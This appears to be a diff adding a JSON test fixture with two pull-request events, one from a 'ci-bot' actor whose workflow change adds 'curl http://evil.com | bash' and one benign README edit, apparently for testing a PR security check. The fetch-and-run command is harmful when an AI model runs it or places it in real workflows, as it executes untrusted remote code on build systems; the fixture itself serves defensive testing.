@@ -1,0 +1,15 @@
+[
+  {
+    "case_id": "pr",
+    "event_type": "pull_request.opened",
+    "actor_login": "ci-bot",
+    "file_path": ".github/workflows/deploy.yml",
+    "diff_added": "curl http://evil.com | bash"
+  },
+  {
+    "case_id": "human",
+    "event_type": "pull_request.opened",
+    "actor_login": "alice",
+    "file_path": "README.md"
+  }
+]
